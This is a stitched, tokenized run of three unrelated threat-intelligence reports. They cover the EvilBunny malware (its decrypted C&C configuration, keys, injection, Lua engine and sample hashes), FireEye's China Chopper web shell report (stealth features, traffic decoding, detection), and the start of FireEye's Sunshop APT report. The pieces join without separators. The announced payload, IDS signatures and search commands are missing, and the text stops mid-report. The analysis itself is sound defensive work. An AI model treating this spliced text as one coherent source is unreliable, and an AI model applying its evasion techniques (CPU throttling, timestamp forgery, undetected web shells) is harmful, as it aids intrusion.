Firewall detection works equally via querying WMI through `` SELECT * FROM FirewallProduct '' , while this time the malware searches for the attributes ' enabled ' , ' VersionNumber ' and ' DisplayName ' .
It will later either be exfiltrated to a C & C server directly or dumped to a local file on disk .
Either way , the results of this check do not influence the flow of execution .
After start - up the malware aims to inject itself to an svchost.exe process .
For stealthiness the malware can either inject itself as a remote thread to a running svchost.exe process or perform the same procedure on a newly created one .
As a singular means of persistence the malware relies on the auto - start registry key created by its dropper under [ HKLM|HKCU ] \ ...
Also , the payload retrieves the dropper 's path from ' isakmpAutoNegociate ' under [ HKLM| HKCU ] \Software\Microsoft\IPSec , then deletes the binary and the ' isakmpAutoNegociate ' registry key .
At start - up netmgr.exe decrypts a configuration file stored in its resource section , revealing three URLs , among timeout settings and encryption keys : • http : //le - progres.net / images / php / test.php ? rec=11206 - 01 • http : //ghatreh.com / skins / php / test.php ? rec=11206 - 01 • http : //www.usthb - dz.org / includes / php / test.php ? rec=11206 - 01 All three of these URLs served as C & C contacts when the attack was still ongoing , sending commands or Lua scripts to the infected host .
Interesting is that two of the domains are actual fake domains resembling legitimate websites while one is a legitimate domain nowadays .
Le - progres.net could be easily confused with leprogres.fr , the official website of the Lyon news paper Le Progres .
Usthb - dz.org is remarkably similar to usthb.dz , the website of the University of Sciences and Technology Houari Boumediene in Algiers , Algeria .
The third domain though , ghatreh.com , is the legitimate address of an Iranian news website .
According to domaintools.com , this domain has been created in November 2004 while the last change happened in September 2012 .
Also , domaintools.com reveals 14 unique IP addresses and 4 different registrars .
It is assumed that the domain has been dropped by the attackers in 2012 and picked up by legitimate operators .
The IP addresses of the domains in 2011 , at a time when dropper , payload and C & Cs were still active , were 69.90.160.65 , 70.38.107.13 and 70.38.12.10 .
All three IPs are located in Canada , two relate to Montréal , one to Oakville .
The complete passive DNS history can be reviewed in appendix A .
The binary also contains the URL ' http : //1.9.32.11/bunny / test.php ? rec = nvista ' , but the purpose of it remains unclear .
This IP address is never contacted by the malware .
Find the entire decrypted configuration below : < COMMAND_KEY > wqNbo8DSbWZiq1QZ4NnmTcibYRJIFxmlSBQh1zdF8IlDKin2zkNOVtKvlx92Q0QOQnA Nt1NCbDItwVQWY0HBQ2GKYPecpfuQ6JPZG0dQRarhCy7nTT3ukET9YzQEPN81 < /COMMAND_KEY > < STORAGE_KEY > lbuLmdAouhUkSsMXckMUevjNf87S4ATWYwLYGLM44O1ortQEE2vr34QGzjPhrWeosFB YQpT6dRwDuPPuP13zzqZhW3PeCQA7OUEghovMwEGYx1annboIwRxKbhUOIMsf < /STORAGE_KEY > < RESPONSE_KEY > 8kMQOWondQc2ZgYgirg9NHg0QUiIIBdPe0YtIVfvxa9rvJ9wtFGx8ko4oFY34PrSkW 9cKzEFZYDnM54qeWcvSMIi9sBAkcD5ggFDmQOGdO42ef344I7s9wAKoAXKeq1s < /RESPONSE_KEY > < COMMAND_FILE_PATH_AND_PREFIX > % SELFDIR % \net.cap < /COMMAND_FILE_PATH_AND_PREFIX > < URL1 > http : //le - progres.net / images / php / test.php ? rec=11206 - 01 < /URL1 > < URL2 > http : //ghatreh.com / skins / php / test.php ? rec=11206 - 01 < /URL2 > < URL3 > http : //www.usthb - dz.org / includes / php / test.php ? rec=11206 - 01 < /URL3 > < INJECTED > 0 < /INJECTED > < STARTDELAY > 0 < /STARTDELAY > < DIEDELAY > 120 < /DIEDELAY > The configuration provides three keys for encryption and decryption of data .
The command_key is used to decrypt commands received from the C & C server , the storage_key is used to encrypt and decrypt data being stored to files on disk and the response_key will encrypt callbacks to the C & C server .
All data exchanged with any of the C & C servers as well as data stored to a file on disk is encrypted with the according key .
Diedelay and startdelay are timeout settings , the exact use of the parameter injected is unclear up to the time of writing .
The malware performs C & C command parsing and Lua script execution with dedicated threads , of which every thread creates its own net.cap file , extending the name by a fixed digit namely 0 , 1 , 3 or 4 .
At runtime the malware adds additional configuration parameters , which are not assigned an obvious name like those retrieved from the resource section .
The synonyms for all encrypted configuration values as they are stored in Windows registry are : – ipsecFilterData – ClassID – ipsecID – ipsecISAKMP – ipsecData – ipsecDSA – ipsecSA – ike – ikeID – isakmpID – isakmpKey – HMACSHA1 – isakmpData After the configuration is retrieved from the resource section the malware will create a subkey for every parameter under [ HKLM|HKCU ] \Software\Microsoft\IPSec .
This key has initially been created by the dropper .
The attributes are encrypted before being written to registry , and will be decrypted on the fly every time the malware requests a specific parameter .
Suspect # 4 comes with a solid multi - threading model , which seeks to assure fail - safe and high - performance execution .
The malware runs a main thread , which manages four worker threads and performs C & C command parsing and Lua script execution .
The worker threads are dedicated to receive commands and scripts through different ways .
Next to that , the main thread also runs sub threads to maintain log files the malware creates at during execution and to keep track of the overall system load the malware creates .
The threads are coordinated via named events , global flag variables , in some cases also mutexes or semaphores are used .
The main action of the malware is carried out in the main thread , which parses commands and executes Lua scripts , provided by the worker threads via command files .
The threading model is summarized in the following graphic .
A dedicated thread is present for monitoring the CPU load the malware itself generates .
Therefor the thread enumerates all threads from the current process and calculates their execution time .
The user- and kernel land execution time is measured for every thread using the kernel32 ! GetThreadTimes API ; then aggregated , so the final value holds the overall CPU usage time of the malware process .
The thread keeps track of the time passing between executions .
If the malware 's active execution time in percentage of this delta exceeds a configured threshold , the malware will suspend all threads of its process for at least 5s .
The threshold is retrieved from configuration in Windows registry , and can be controlled by the botmaster via the C & C command setcpulimit ( see section 2.5 ) .
This clearly is an attempt to keeping a low profile on the infected machine .
By maintaining its own execution load the bot 's compromised svchost.exe process will not catch attention on the process list .
The backfile launching thread got its name from the named event ' backfilelaunching ' which is set to indicate that the dedicated thread has started .
Also in a 1s - frequency the malware runs the backfile thread to push dump files to one of its remote servers .
The files are named Perflib_Perfdat_dmpbX.dat , where X is an index number starting with 0 .
The data written to the file are status messages including a time stamp , which are returned by command and Lua script execution .
The data is encrypted using the response_key from the configuration .
The term ' hearer ' can be found plenty of times in the binary , it is assumed that it is equivalent to ' listener ' of some sort .
All together suspect # 4 manages 4 hearer threads including one command file per thread .
The command file is named net.capX , where X is the index of the thread ; 0 , 1 , 3 or 4 .
The hearer thread 's purpose is to receive instructions from the remote servers and provide them to the main thread .
Such instructions are commands and/or one or more Lua scripts .
Each hearer has a dedicated method to receive instructions which is either separately via HTTP from the server , aggregated through a downloaded data file or as tasks to be configured as scheduled tasks .
The hearer threads dump the received instructions to their net.cap-files , from where the main thread 's command parsing routine fetches and executes them .
The data is encrypted with the storage_key before written to disk .
Generic hearer thread .
Started , but not involved in command fetching and parsing .
Hearer 1 receives commands and Lua scripts directly via HTTP from one of the C & C servers .
These are encrypted with the storage_key and stored to net.cap1 in the malware 's working directory .
Interestingly , the malware handles successful downloads with the HTTP status code 418 .
This code is not part of the original HTTP standard , but was introduced in RFC2324 , 1998 's traditional IETF April Fool 's joke .
The textual representation of status 418 is `` I ' m a teapot . '' .
Hearer 2 is responsible for managing the scheduled tasks , titled ' crontasks ' by the malware .
The tasks are stored in a file named perf.tmp , and when due for execution are copied to the according net.cap-file , net.cap2 in this case .
From there the main thread can fetch and execute them in its command parsing loop .
Hearer 2 also creates a swap file named perf.tmp2 , which helps in selectively editing the initial task file and in managing the task list .
Hearer 3 searches for a file named netdump.db in its local working directory .
If found , the thread will read its content in chunks representing different commands and paste these to net.cap3 .
Again , the data is encrypted with the storage_key .
No functionality could be found in the malware code to write to netdump.db , which leaves the conclusion that this file will be downloaded from a C & C server .
After initializing and starting all four hearer threads the main thread enters a command parsing loop .
For every hearer the main thread invokes the command and script execution function .
Therefor data is read from the encrypted net.capX- file , where X indicates the index of the hearer ; 0 , 1 , 3 or 4 .
Once decrypted , this data is parsed to find valid C & C commands and / or valid Lua scripts to execute .
More details on command and script execution can be found in section 2.6 . Notable is that the command parsing and execution happens in a serial fashion , while Lua script execution is handed over to dedicated threads .
Also , no direct relation between C & C commands and Lua script execution could be identified .
The most notable actions of the bot can be summarized as follows : • Downloads and executes Lua scripts to instrument its own code • Can install managed tasks ( named ' crontask ' ) for its integrated engine • Can maintain FTP connections • Can send and receive files via HTTP • Writes runtime information to local files • Encryption for local data and network communication However , suspect # 4 does accept a list of hard coded commands to be sent by the C & C server .
These mainly serve the purpose of controlling operation of the bot on the infected machine , such as restarting threads or setting configuration parameters .
The full list of C & C commands can be found below : mainfrequency – Set a new timeout value for the command parsing loop .
Every command execution function returns a status line , such as for example `` ftp command succeeded for : % s ! \n '' .
The initial command , the status line and a current time stamp are encrypted and sent back to the C & C server .
Additionally , the same data is written to the Perflib_Perfdat_dmpbX.dat file which is regularly pushed to the C & C by the backfile thread .
For hearer 1 and 3 the command parsing routine will additionally manage two continuous log files which are named Perflib_Perfdata41X.dat and Perflib_Perfdata_42X.dat , where X is the respective hearer thread 's index .
More specifically , command parsing will increment a global variable holding the total amount of executed commands and scripts .
This 4-byte value is appended to Perflib_Perfdata41X.dat before and Perlfib_Perfdata42X.dat after command execution .
These files survive restart or cleanup , so every time the malware boots it reads the current status from these logs and continues from the latest value .
This mechanism helps the botmaster to keep track of the bots activity on an infected host and could also be helpful in trouble shooting .
Suspect # 4 incorporates an interpreter for Lua 5.1 , LuaSocket 2.0.2 and C / Invoke Lua bindings .
Lua is a lightweight programming language designed as a scripting language which can be embedded into applications , providing a C API for doing so .
C bindings are provided through C / Invoke and enable Lua scripts to perform callbacks to C / C++ code .
This constellation can be found in many video game engines to provide polymorphic behavior in games .
Engine and game play features are injected through Lua scripts , which instrument the game engine code .
The Lua interpreter is very small , compiled roughly 180kB , thus can easily be integrated in an application .
The C / Invoke bindings enable Lua to be completely independent from the C / C++ application , so injected scripts can be pure Lua code .
A script , if delivered to one of the hearer threads , will be provided through the corresponding net.cap-file of the hearer along with a C & C command .
If a script is included in the data read from the net.cap-file , this is indicated by the start sentinel ' < $ ' .
Likewise , the end of a script is indicated by ' $ > ' .
Command execution goes hand in hand with Lua script execution , thus is dependent of the four hearer threads .
The work flow for each hearer per execution loop in the main thread is as follows : • Read and decrypt content from according net.cap-file • See if an entry of the C & C command list can be found in the decrypted data • If so , execute the command • Hand the data over to the Lua interpreter thread • See if a Lua script can be located , searching for start and end sentinel • If so , start Lua thread and execute script • If more than one script can be found start more Lua threads recursively After starting the Lua thread requests a value from Windows registry named ' EnableLua ' under SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System .
This key name stands for enable limited user account .
When set to zero this key effectively disables UAC ( User Account Control ) .
The malware only requests the key value but does not change it .
The value is later used by a callback function named ' popenWin ' to decide on a way how a sub process should be started .
Options are via WMIC using wmic.exe , Microsoft CScript engine using cscript.exe or directly via spawning a command line through cmd.exe .
However , spawning sub processes is not the only feature which comes with Lua .
The Lua interpreter is a powerful code base which enables suspect # 4 to change functionality on the fly , as different scripts are downloaded and executed .
The scripts define the functionality as they perform callbacks to the C / C++ code in the malware binary .
The potential of the Lua interpreter can be investigated on the project homepage .
Like command execution , Lua script execution also returns a status message which is extended by a time stamp and forwarded to one of the C & C servers , as well as written to the backfile log in Perflib_Perfdat_dmpbX.dat .
Likewise , the Lua threads log their activity to Perflib_Perfdata_41X.dat/42X.dat .
Due to the absence of C & C servers which hold the Lua scripts for the bot 's Lua interpreter the true nature of this feature remains unclear .
Throughout analysis and due to the help of Paul Rascagniéres a number of binaries which relate to EvilBunny were identified : 2a64d331964dbdec8141f16585f392ba 40E0F0681C79D70AC0329E68A94294CB 8132ee00f64856cf10930fd72505cebe e8a333a726481a72b267ec6109939b0d 3bbb59afdf9bda4ffdc644d9d51c53e7 c40e3ee23cf95d992b7cd0b7c01b8599 330dc1a7f3930a2234e505ba11da0eea 83b7c532663f11bf994a1b518880557d b8ac16701c3c15b103e61b5a317692bc bbf4b1961ff0ce19db748616754da76e The binaries share parts of source code , most notably is the identical API name obfuscation algorithm and respective key AB34CD77h .
The indicators of a relation among all samples or a subset of samples are the following : • Same API name obfuscation algorithm and key • Equal infection routines / source code • Equal AntiVirus product enumeration technique • Shared C & C domain names and equal C & C commands • Equal proxy bypass technique / source code Mentioned set of malware also shows parallels in coding style and structure .
However , it has to be pointed out that suspect # 4 without doubt sticks out in terms of complexity and functionality .
It is assumed that suspect # 4 was created by the same authors , but this can not be proved .
Four of the set of identified samples are identical in functionality and capability .
They possess respectable flooding capabilities and also provide remote access .
However , they do not support data stealing or any spying functionality .
Two more C & C domains were identified for this group : http : //callientefever.info / img / new / n.php http : //fullapple.net / pictures / bkp / n.php Regarding the nature of the attack or the actor behind EvilBunny only vague conclusions can be drawn .
There has been public contemplation that the actor might be french and that the malware might be related to samples analyzed by the Canadian CSEC .
However , there has n't been any hard evidence which links the attack to a group or a geographical location .
Attribution is a tricky task and assumptions must not be drawn easily .
For providing technical insights , support and if I remember right even water , coffee or occationally rum , I want to express my deepest gratitude to Morgan Marquis - Boire , Sebastien Larinier , Paul Rascagniéres , Nicolas Brulez , Michael Shalyt and Inbar Raz .
Further I want to thank Fred Arbogast , Alexandre Dulaunoy , Raphael Vinot and the remaining organizing team of Hack.lu for their advice and effort , even in situations of widespread insomnia .
All of you – such wow , very awesome ; rock on ! [ 1 ] An Analysis Of CVE-2011 - 4369 http : //blog.9bplus.com / analyzing - cve-2011 - 4369-part - one/ [ 2 ] ThreatExpert Report on c40e3ee23cf95d992b7cd0b7c01b8599 http : //www.threatexpert.com / report.aspx ? md5=c40e3ee23cf95d992b7cd0b7c01b8599 [ 3 ] How to disable UAC https : //social.technet.microsoft.com / Forums / windowsserver / en - US/0aeac9d8 - 3591 - 4294- b13e-825705b27730/how - to - disable - uac [ 4 ] The Lua Project http : //www.lua.org/ [ 5 ] The C / Invoke Project http : //www.nongnu.org / cinvoke/ [ 6 ] Lua scriptable game engines ( Wikipedia ) http : //en.wikipedia.org / wiki / Category : Lua - scriptable_game_engines [ 7 ] All file hashes related to the EvilBunny malware http : //pastebin.com/7iedeFF5 [ 8 ] Hack.lu 2014 Keynote on TS / NOFORN http : //www.slideshare.net / pinkflawd / tsnoforn [ 9 ] Quand les Canadiens partent en chasse de « Babar » http : //www.lemonde.fr / international / article/2014/03/21/quand - les - canadiens - partent - en- chasse - de - babar_4387233_3210.html Marked in Grey is the data of sinkholes for the mentioned domains , currently operated by Kaspersky .
China Chopper is an increasingly popular Web shell that packs a powerful punch into a small package .
In the space of just 4 kilobytes , the Web shell offers file and database management , code obfuscation , and more - all in an easy - to - use graphical user interface that even novices can use .
Given its growing prevalence , especially among Chinese cybercriminals , China Chopper warrants much more exposure than it has received to date .
Outside of an insightful blog post from security researcher Keith Tyler , little useful information on China Chopper is publically available .
To contribute something new to the public knowledge base - especially for those who happen to find the China Chopper server - side payload on one of their Web servers - FireEye studied the components , capabilities , payload attributes , and the detection rate of this 4 kilobyte menace .
This report describes the features that make China Chopper an increasingly popular tool for cyber attackers .
And more important , the report explains how security professionals can better detect the Web shell through network traffic and on compromised systems .
China Chopper is a simple backdoor in terms of components .
It has two key components : the Web shell command - and - control ( CnC ) client binary and a text - based Web shell payload ( server component ) .
The text - based payload is so simple and short that an attacker could type it by hand right on the target server - no file transfer needed .
The Web shell client was originally available on www.maicaidao.com .
The client binary is packed with UPX and is 220,672 bytes in size , as shown in Figure 1 .
The executable file compressor UPX unpacks the binary to reveal details hidden by the packer .
C : \Documents and Settings\Administrator\Desktop > upx -d 5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe Ultimate Packer for eXecutables Copyright ( C ) 1996 - 2011 UPX 3.08w Markus Oberhumer , Laszlo Molnar & John Reiser Dec 12th 2011 File size Ratio Format Name -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- - 700416 < - 220672 31.51 % win32/pe decomp.exe Unpacked 1 file .
Because the strings are not encoded , examining them in the unpacked binary exposes how the backdoor communicates .
Appearing in the strings are an intriguing reference to google.com.hk using the Chinese ( simplified ) language parameter ( Figure 3 ) and references to the text `` Chopper '' ( Figure 4 ) .
In action , China Chopper is a menu - driven GUI full of convenient attack and `` target - management '' features .
When opened , the client displays example shell entries that point to www.maicaidao.com , which originally hosted components of the Web shell .
To add a target , attackers right click within the client window , select Add from the menu and enter the target IP address , password , and encoding as shown in Figure 5 .
But the client is only half of the remote access tool ( RAT ) -and not likely the part that would appear on a targeted network .
Its communication relies on a payload in the form of a small Web application .
This payload is available in a variety of languages such as ASP , ASPX , PHP , JSP , and CFM .
Table 2 shows some of the original files available for download shown with their MD5 hashes .
Even though the MD5s are useful , this is a text - based payload that can be easily changed , resulting in a new MD5 hash .
Here is an example of just one of China Chopper 's text - based payloads ( for more details , see `` Payload Attributes '' on Page 11 ) : In real - world use , `` password '' would be replaced with the actual password to be used in the client component when connecting to the Web shell .
The capabilities of both the payload and the client are impressive considering their size .
The Web shell client contains a `` Security Scan '' feature , independent of the payload , that gives the attacker the ability to spider and use brute - force password guessing against authentication portals .
In addition to vulnerability hunting , China Chopper has excellent CnC features when combining the client and payload , include the following : • File Management ( File explorer ) • Database Management ( DB client ) • Virtual Terminal ( Command shell ) In China Chopper 's main window , right - clicking one of the target URLs brings up a list of possible actions ( see Figure 7 ) .
Used as a RAT , China Chopper makes file management simple .
Abilities include uploading and downloading files to and from the target , using the file - retrieval tool Wget to download files from the Web to the target .
Attackers can also edit , delete , copy , and rename files - and even change their time stamp .
The Modify the file time option is a surprisingly effective stealth technique .
Figure 9 shows the time stamps of the three files in the test directory before the Web shell modifies the time stamps .
By default , Windows Explorer shows only the `` Date Modified '' field .
Without the time stamp change , the Web shell easily stands out because it is newer than the other two files .
Figure 10 shows the date of the file after the Web shell modifies the time stamp .
The `` Date Modified '' value on the Web shell shows up as the same as the other two files .
This is the default field displayed to users , so to the untrained eye it easily blends in - especially with many files in the directory .
Clever investigators may think that they can spot the suspicious file due to the creation date being changed to the same date as the modified date .
But this is not necessarily anomalous .
Additionally , even if the file is detected , the forensic timeline is skewed because the date that the attacker planted the file is no longer present .
Finding the real date that the file was planted requires examining the Master File Table ( MFT ) .
After acquiring the MFT using FTK , EnCase , or other means , FireEye recommends using mftdump .
Written by FireEye researcher Mike Spohn , mftdump is a great tool for extracting and analyzing file metadata .
Table 3 shows the time stamps pulled from the MFT for our Web shell file before and after the time stamps were modified .
The `` fn * '' fields retain their original times , so some useful information remains .
The database management functionality is impressive and helpful to the first - time user .
Upon configuring the client , China Chopper provides example connection syntax .
After connecting , China Chopper also provides useful SQL commands .
Finally , China Chopper provides command shell access for OS - level interaction , further demonstrating its versatility .
China Chopper is stealthy due to a number of factors , including the following : • Size • Server - side content • Client - side content • AV detection rate ( or lack thereof ) Malicious and benign software usually suffers from the same principle : more features equals more code , which equals larger size .
Considering how many features China Chopper offers , it is incredibly small - just 73 bytes for the ASPX version , or 4 kilobytes on disk ( see Figure 14 ) .
Compare that to other Web shells such as Laudanum ( 619 bytes ) or RedTeam Pentesting ( 8,527 bytes ) .
China Chopper is so small and simple that an attacker could conceivably type the contents of the shell by hand .
The server - side content could easily be overlooked among the other files associated with a vanilla install of a complex application .
The code does not look malicious - just odd .
Below are the contents of the Web shell for two of its varieties .
Because all of the code is server - side language that does not generate client - side code , browsing to the Web shell and viewing the source as a client reveals nothing .
Running the Web shell through the virus - scanning website `` No Virus Thanks '' shows a detection rate of 0 out of 14 , indicating that most , if not all , anti - virus tools would miss the Web shell on an infected system .
The same holds true for VirusTotal .
None of its 47 anti - virus engines flags China Chopper as malicious .
China Chopper can run on any Web server capable of running JSP , ASP , ASPX , PHP , or CFM - the majority of Web application languages .
China Chopper can also run transparently on both Windows and Linux .
This OS and application flexibility make China Chopper an even more dangerous Web shell .
Figure 19 shows it running on Linux with PHP .
Here , the contents of the PHP version are just as minimalistic .
While the available options differ depending on what platform China Chopper is running on , the file management features in Linux ( see Figure 20 ) are similar to those in Windows .
The database client example shown in Figure 21 is MySQL instead of MS - SQL , but it offers many of the same capabilities .
The virtual terminal looks familiar ( Figure 22 ) , but uses Linux commands instead of Windows because they are ultimately interpreted by the underlying operating system .
China Chopper 's delivery mechanism is flexible due to the size , format , and simplicity of the malware 's payload .
This small , text - based payload can be delivered using any of the following mechanisms : • WebDAV file upload • JBoss jmx - console or Apache Tomcat management pages ( For more details on this attack vector , read FireEye consultant Tony Lee 's explanation ) • Remote exploit with a file drop • Lateral propagation from other access After examining the server - side payload and the client used to control the Web shell , the next step to understanding China Chopper is observing its traffic .
Having both the server and client components enables researchers to start a packet capture to view the contents of typical traffic .
As shown in Figure 23 , the client initiates the connection over TCP port 80 using the HTTP POST method .
Because this is TCP traffic , researchers can `` follow the TCP '' stream in Wireshark , a popular open - source network - protocol analyzer that works in Unix and Windows .
In Figure 24 , the traffic in red at the top is from the attacker ( Web client ) .
The traffic shown in blue at the bottom is the response from the target ( Web shell ) .
As highlighted above , the majority of the attacker traffic appears to be Base64 encoded .
This is not a problem though , because it can be easily decoded .
Using the `` TextWizard '' feature of the free Fiddler Web debugger reveals what the attacker is sending .
Fiddler needs this to be converted to an equal sign for proper decoding .
Decoded traffic : The decoded traffic presents something more readable .
But the Base64-decoded traffic shows an attempt to decode more Base64 traffic stored as `` z1 '' and `` z2 .
The Base64-encoded parameters z1 and z2 are highlighted in the following output : Base64-decoded parameters z1 and z2 : This code explains how the client communicates with the shell .
The `` Password '' parameter passes the code to the payload to be executed .
The z1 is cmd , and z2 contains the arguments to the command prompt sent via cmd /c .
All output is sent to standard output ( stdout ) back to the attacker , which creates the following response to the whoami command and the present working directory : Understanding the contents of China Chopper and what its traffic looks like allows researchers to detect this pest both at the network and the host level .
With a standard Snort IDS in place , this traffic can be caught with relative ease .
Keith Tyler provides the following basic IDS signature in his previously cited China Chopper blog post : To reduce false positives , tighten the Snort IDS signature to focus on China Chopper by looking for contents of `` FromBase64String '' and `` z1 '' as follows : The following IDS signature looks for content of `` FromBase64String '' and any combination of `` z '' followed by one to three digits - it would find `` z1 '' , `` z10 '' , or `` z100 '' for example .
The idea : if the first command ( z1 ) is missed , the signature still catches subsequent commands .
Both of these IDS signatures can be optimized further to factor depth and offset .
Be sure to put a validSID in before implementing and test the signature for performance .
Because the shells must contain a predictable syntax , researchers can quickly attempt to find files that have that code in play .
Many methods can be used to find files that contain China Chopper .
The quickest and easiest method , especially on a Linux machine , is probably using regular expressions .
As shown in Figure 26 , a quick egrep across the Web directory can help identify infected files .
As shown in Figure 26 , the egrep and regex commands are a powerful combination .
While the regex syntax may seem like gibberish , mastering it is not as difficult as it seems at first glance .
Ian Ahl has created a few tutorials that can help improve researchers ' regex skills .
Here are two to get started : • Regex basics ( http : //www.tekdefense.com / news/2012/10/21/tektip - ep12-regex - basics.html ) • Using regex with Notepad ( http : //www.tekdefense.com / news/2013/1/6/tektip - ep19-using - regex - with - notepad.html ) Windows also provides a way to search files using regular expressions with its native findstr command .
The command string differs from the regex equivalent .
This was necessary to get around some of the ways that findstr interprets regex .
The findstr command runs as follows : These examples show detection in the PHP shell .
To find the ASPX shell , modify the regex to fit the syntax of the ASPX shell as shown : Researchers unsure where all of the PHP or ASPX files are on a Windows host can use the dir command with some extended options to help identify Web files to run the regex command against ( see Figure 28 ) .
Findstr also has an option to search all subdirectories ( see Figure 29 ) , as follows : Armed with knowledge about China Chopper 's features , platform versatility , delivery mechanisms , traffic analysis , and detection - along with a few free software tools - researchers can begin eradicating this elegantly designed but dangerous menace .
To learn more about how FireEye can help your organization find China Chopper and other advanced malware , visit www.fireeye.com .
Many seemingly unrelated cyber attacks may , in fact , be part of a broader offensive fueled by a shared development and logistics infrastructure - a finding that suggests some targets are facing a more organized menace than they realize .
This report examines 11 advanced persistent threat ( APT ) campaigns targeting a wide swath of industries .
Though they appeared unrelated at first , further investigation uncovered several key links between them : the same malware tools , the same elements of code , binaries with the same timestamps , and signed binaries with the same digital certificates .
Taken together , these commonalities point to centralized APT planning and development .
How prevalent this model has become is unclear .
But adopting it makes financial sense for attackers , so the findings may imply a bigger trend .
This report focuses on two key findings : • Shared development and logistics • A shared malware - builder tool Examining the 11 APT campaigns revealed a shared development and logistics operation used to support several APT actors in distinct but overlapping campaigns .
This development and logistics operation is best described as a `` digital quartermaster .
This digital quartermaster also might be a cyber arms dealer of sorts , a common supplier of tools used to conduct attacks and establish footholds in targeted systems .
The tools appear to be written in Chinese , and the testing infrastructure appears to all be configured with the native Chinese language character set , and the dialogues and menu options in the builder tool are in Chinese .
In May 2013 , FireEye first reported on the `` Sunshop '' campaign , which compromised several strategic websites and redirected visitors to a site serving multiple exploits .
In August 2013 , FireEye reported that the campaign was continuing and , later that month , discovered additional related attacks .
Examining the underlying infrastructure of these attacks revealed that the campaign utilized resources shared across other APT campaigns not initially tied to Sunshop .
The other campaigns included multiyear onslaughts targeting companies across 15 industries .
Given the wide range of targets observed , the campaigns ' specific objectives ( beyond the obvious intellectual property theft ) are unclear .
This report outlines the following : • The quantity and categories of malicious binaries related to the originally identified Sunshop attacks and 10 other campaigns subsequently linked to Sunshop • The underlying infrastructure , including components of code used across these campaigns • Clusters of APT activity previously believed to be unrelated • A malware builder that likely supported one of these APT activity clusters The 11 interconnected campaigns targeted these industries : • Aerospace / Defense / Airlines • Applied research and development • Chemicals / Manufacturing / Mining • Higher education • Entertainment / Media / Hospitality • Energy / Utilities / Petroleum refining • Financial services • Federal government • State and local government • Healthcare / Pharmaceuticals • High - tech • Insurance • Legal services • Services / Consulting / VAR • Telecommunications FireEye detected activity from the campaigns between July 2011 and September 2013 , but they were likely active before then .
Though the campaigns utilized varying techniques , tactics , and procedures ( TTPs ) , they all leveraged a common development infrastructure .
They shared ( in various combinations ) the following : • Portable executable resources • Digital certificates • API import tables • Compile times • Command - and - control ( CnC ) infrastructure Based on the evidence , this report outlines the following possible conclusions : • [ High Confidence ] A `` Sunshop Digital Quartermaster '' ( SDQ ) exists and supports separate APT campaigns .
Another conceivable possibility is tha the 11 clusters of activity , previously believed to be independent campaigns run by different actors , are in fact one cluster of activity run by one well - resourced actor .
However , we believe this scenario is less likely because each cluster of activity utilized malware samples with different artifacts such as passwords , campaign identifiers , and mutexes .
These artifacts were generally consistent within each cluster of activity but differed across clusters .
Alternatively , different actors may be responsible for the documented 11 clusters of activity .
Instead of relying on a centralized development and logistics operation , they share TTPs through formal or informal channels .
On May 20 , 2013 FireEye first reported on the Sunshop campaign .
The actor responsible for this campaign compromised a number of strategic websites , redirecting visitors to a site serving multiple exploits .
Almost three months later , FireEye reported that the campaign was continuing .
We discovered additional related attacks about a week after that .
During the intervening time , we examined the underlying infrastructure supporting these attacks and found that the Sunshop campaign utilized resources shared across a number of other APT campaigns not initially tied to Sunshop .
What we initially believed to be 11 different APT campaigns used the same malware tools , the same elements of code , binaries with the same timestamps , and signed binaries with the same digital certificates .
Through this discovery , we believe that we have identified a shared development and logistics operation used to support a number of different APT actors engaged in distinctive but overlapping campaigns .
This development and logistics operation is best described as a digital quartermaster whose mission is to supply and maintain malware tools and weapons used in support of cyber espionage operations .
This digital quartermaster is a possible cyber arms dealer , supplying the operators responsible for conducting attacks and establishing footholds within targeted organizations .
As such , we refer to this entity as the Sunshop Digital Quartermaster ( SDQ ) .
To support this conclusion , we first present an overview of our research , including the total number and type of malicious binaries we found to be related to Sunshop and the 10 other linked campaigns .
We then describe the underlying infrastructure , including the components of code used across these campaigns .
We further describe the different clusters of APT activity that we previously believed to be unrelated .
Finally , we describe one of the malware builders we believe was used to support one of these clusters of APT activity .
We collected 110 unique binaries , which were detected as Trojan . APT.9002 , Trojan . APT.PoisonIvy , Trojan . APT.Gh0st , Trojan . APT.Kaba , and Trojan . APT.Briba .
Sixty - five of these binaries were packaged with two unique manifest resources , and 47 were signed with six different digital certificates .
The binaries connected to 54 unique fully qualified domains .
We identified these samples by searching binaries packaged with the two unique portable executable ( PE ) resources that we had previously identified .
We believe that these PE resources are unique to Sunshop and the 10 other linked campaigns .
We also searched for samples signed with the six different digital certificates that were used to sign binaries connected to these campaigns .
These certificates were not unique to these campaigns and have been used to sign unrelated malware .
Therefore , we cross - checked samples signed with any of these certificates to ensure that they were , in fact , related to the 10 campaigns we identified as linked to Sunshop .
As we identified related campaigns that leveraged the unique PE resources or digital certificates , we then pivoted off the CnC infrastructure to identify additional samples .
We cross - checked samples identified through this process to ensure that they did indeed share the code elements that we previously identified as unique to Sunshop and its associated campaigns .
We searched our internal repositories , including the FireEye high performance cluster and other wellknown external repositories .
We primarily relied on running active searches with YARA signatures designed to identify samples , with either the PE resources or digital certificates .
We also compared the import tables used in each sample to establish additional links between the 10 different campaigns linked to Sunshop .
All of this research led us to the above - mentioned 110 binaries .
Figure 2 plots the samples in a Maltego chart .
Figure 2 shows only domains , IP addresses , and MD5 malware / dropper hashes collected during our research .
These limited data points display 11 different and seemingly independent clusters of activity .
We continued our analysis by adding the following additional data points to our graph .
Figure 3 illustrates the overlaps and connections that exist between what initially appeared to be 11 independent campaigns .
This chart shows how the additional data points of the shared PE resources , commonly used digital certificates , and identical import tables can link these different campaigns together .
Our research analyzed the following to identify and tie all 11 campaigns to the SDQ : • PE resources • Import tables • Authenticode / Digital certificates • Compile times We found that 64 of the 110 samples analyzed during this analysis were packaged with two almost identical portable executable resources .
In both cases , the resources appeared to be manifests generated by the Nullsoft scriptable installation system ( NSIS ) .
Nullsoft is a script - driven tool that simplifies the installation routines of executable files onto the Microsoft Windows operating system .
We identify the first of these manifest resources as the `` Sunshop manifest .
We found 44 unique binaries packaged with the above Sunshop manifest .
These samples were detected as Trojan . APT.9002 , Trojan . APT.Gh0st , and Trojan . APT.PoisonIvy .
We observed these 44 samples used in eight of the 11 different campaigns discussed below .
We identify the second manifest resource as the `` DTL manifest .
These binaries were detected as Trojan . APT.9002 .
We observed these 20 samples used in five of the 11 different campaigns discussed below .
The only difference between these manifest resources is the indentation of the < security > elements .
Lines 10 through 13 in Figure 6 detail this difference .
This slight difference results in a different hash for the resource .
